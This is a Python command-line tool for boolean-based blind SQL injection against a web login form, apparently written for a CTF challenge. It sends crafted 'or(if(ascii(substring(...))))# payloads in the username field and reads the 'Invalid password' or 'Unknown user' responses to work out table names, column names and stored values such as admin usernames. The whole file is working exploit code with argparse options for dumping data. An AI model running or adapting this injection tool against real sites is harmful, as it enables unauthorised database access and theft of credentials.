#!/usr/bin/env python
#-*- coding:utf-8 -*-
import requests,sys
import color
import argparse

#usage
#python -u -t  
#python -u -c -T admins
#python -u -C username -T admins -D 1(limit offset) --length length(username or password)

def table_count(url):
	left = 0 
	right = 20   #默认表个数不超过20个
	while 1:
		mid = int((left+right)/2)
		if mid==left:
			break
		payload = "'or(if(((select count(*) from information_schema.tables where table_schema=database())<%d),1,0))#" %(mid)
		print(payload)
		res = requests.post(url,data={'username':payload,'password':'123'}).text
		if "Invalid password" in res:
			right = mid

		elif "Unknown user" in res:
			left = mid    
	#color.printDarkGreen(u'[+]Current Database Has ('+str(mid)+') Tables\n')
	return mid

def table_name_length(url)->list:
	length_list = []
	tablecount = table_count(url)
	for count in range(tablecount):
		left = 0
		right = 21 	##表名最长不超过21
		while 1:
			mid = int((left+right)/2)
			if mid==left:
				print(u'Length of Table '+str(count+1)+' is '+str(mid)+'\n')
				length_list.append(mid)
				break
			payload = "'or(if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)<%d,1,0))#" %(count,mid)
			print(payload)
			res = requests.post(url,data={'username':payload,'password':'123'}).text
			if "Invalid password" in res:
				right = mid

			elif "Unknown user" in res:
				left = mid     
	return length_list

def table_name(url)->list:
	length_list = table_name_length(url)
	tablecount = len(length_list)
	tables = []
	color.printDarkGreen(u'[+]Starting Inject Table_Name\n')
	for count in range(tablecount):
		length = length_list[count]
		result = ''
		for i in range(length):
			left = 32
			right = 126 	##表名最长不超过21
			while 1:
				mid = int((left+right)/2)
				if mid==left:
					result+=chr(mid)
					print(result)
					break
				payload = "'or(if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))<%d,1,0))#" %(count,i+1,mid)
				print(payload)
				res = requests.post(url,data={'username':payload,'password':'123'}).text
				if "Invalid password" in res:
					right = mid

				elif "Unknown user" in res:
					left = mid
		tables.append(result)
	return tables

def column_count(url,table):
	left = 0 
	right = 20   #默认列个数不超过20个
	while 1:
		mid = int((left+right)/2)
		if mid==left:
			break
		payload = "'or(if((select count(*) from information_schema.columns where table_name='"+table+"')<%d,1,0))#" %(mid)
		print(payload)
		res = requests.post(url,data={'username':payload,'password':'123'}).text
		if "Invalid password" in res:
			right = mid

		elif "Unknown user" in res:
			left = mid    
	#color.printDarkGreen(u'[+]Current Database Has ('+str(mid)+') Tables\n')
	return mid

def column_name_length(url,table)->list:
	length_list = []
	columncount = column_count(url,table)
	for count in range(columncount):
		left = 0
		right = 21 	##列名最长不超过21
		while 1:
			mid = int((left+right)/2)
			if mid==left:
				print(u'Length of column '+str(count+1)+' is '+str(mid)+'\n')
				length_list.append(mid)
				break
			payload = "'or(if((select length(column_name) from information_schema.columns where table_name='"+ table +"' limit %d,1)<%d,1,0))#" %(count,mid)
			print(payload)
			res = requests.post(url,data={'username':payload,'password':'123'}).text
			if "Invalid password" in res:
				right = mid

			elif "Unknown user" in res:
				left = mid     
	return length_list

def column_name(url,table)->list:
	length_list = column_name_length(url,table)
	columncount = len(length_list)
	columns = []
	color.printDarkGreen(u'[+]Starting Inject column_name\n')
	for count in range(columncount):
		length = length_list[count]
		result = ''
		for i in range(length):
			left = 32
			right = 126 
			while 1:
				mid = int((left+right)/2)
				if mid==left:
					result+=chr(mid)
					print(result)
					break
				payload = "'or(if(ascii(substring((select column_name from information_schema.columns where table_name='"+table+"'limit %d,1),%d,1))<%d,1,0))#" %(count,i+1,mid)
				print(payload)
				res = requests.post(url,data={'username':payload,'password':'123'}).text
				if "Invalid password" in res:
					right = mid

				elif "Unknown user" in res:
					left = mid
		columns.append(result)
	return columns

def data_length(url,column,table,number):
	length_list = []
	for count in range(number):
		left = 0
		right = 21 	##列名最长不超过21
		while 1:
			mid = int((left+right)/2)
			if mid==left:
				print('Length of '+ column + str(count+1)+' is '+str(mid)+'\n')
				length_list.append(mid)
				break
			payload = "'or(if((select length(%s) from %s limit %d,1)<%d,1,0))#" %(column,table,count,mid)
			print(payload)
			res = requests.post(url,data={'username':payload,'password':'123'}).text
			if "Invalid password" in res:
				right = mid

			elif "Unknown user" in res:
				left = mid     
	return length_list


def dump(url,column,table,offset,length)->list:
	#dlength = data_length(url,column,table,1)
	columns = []
	result = ''
	print('[+]Starting dump\n')
	for i in range(length):
		left = 32
		right = 126 	
		while 1:
			mid = int((left+right)/2)
			if mid==left:
				result+=chr(mid)
				print(result)
				break
			payload = "'or(if(ascii(substring((select %s from %s limit %d,1),%d,1))<%d,1,0))#" %(column,table,offset-1,i+1,mid)
			print(payload)
			res = requests.post(url,data={'username':payload,'password':'123'}).text
			if "Invalid password" in res:
				right = mid

			elif "Unknown user" in res:
				left = mid
	columns.append(result)
	return columns

if __name__=='__main__':
	# url = 'http://35.190.155.168/bb8f80644d/login'
	# column = 'username'
	# table = 'admins'
	# length = 5
	# offset = 0
	#print(data_length(url,column,table,number))
	# print(dump(url,column,table,offset,length))
	parser = argparse.ArgumentParser(description='Blind Sql inject ')
	parser.add_argument('-u','--url',required=True)
	parser.add_argument('-t','--tablename',action='store_true',help='Get All Table name with Current Database')
	parser.add_argument('-T','--table',help='Set table name ')
	parser.add_argument('-c','--columnname',action='store_true',help='Set table name')
	parser.add_argument('-C','--column',help='Set column name')
	parser.add_argument('-D','--dump',type=int,help='limit num 1')
	parser.add_argument('-L','--length',type=int,help='column length')
	#parser.add_argument('-O','--offset',type=int,help='limit offset')

	#parser.add_argument('--table',required=True,help='Get table')
	args = parser.parse_args()
	if args.tablename:
		print('[+]Starting Get TableName')
		print(table_name(args.url))
	elif args.columnname and args.table:
		print(column_name(args.url,args.table))
	elif args.table and args.column and args.dump:
		print(dump(args.url,args.column,args.table,args.dump,args.length))